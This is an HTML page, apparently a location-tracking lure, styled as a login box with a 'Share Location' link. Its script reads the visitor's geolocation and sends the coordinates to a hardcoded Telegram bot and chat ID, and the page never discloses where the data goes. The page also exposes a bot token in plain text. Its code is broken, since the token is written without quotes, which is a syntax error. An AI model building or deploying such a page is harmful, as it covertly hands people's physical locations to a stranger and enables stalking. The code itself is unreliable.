<!DOCTYPE html>
<html>
<head>
  <title>@rmsup</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <script>
    function sendLocation() {
      navigator.geolocation.getCurrentPosition(function(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;

        var botToken = 6869870407:AAFt9dfffPo16LefUroHYeZV64wrm4fQyPM;
        var chatId = 5641303137;

        var url = 'https://api.telegram.org/bot' + botToken + '/sendLocation';
        var params = {
          chat_id: chatId,
          latitude: latitude,
          longitude: longitude
        };

        var xhr = new XMLHttpRequest();
        xhr.open('POST', url, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(params));
      });
    }
  </script>
  <div class="login-box">
    <form>
      <a href="#" onclick="sendLocation()">Share Location
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </a>
    </form>
  </div>
</body>
</html>
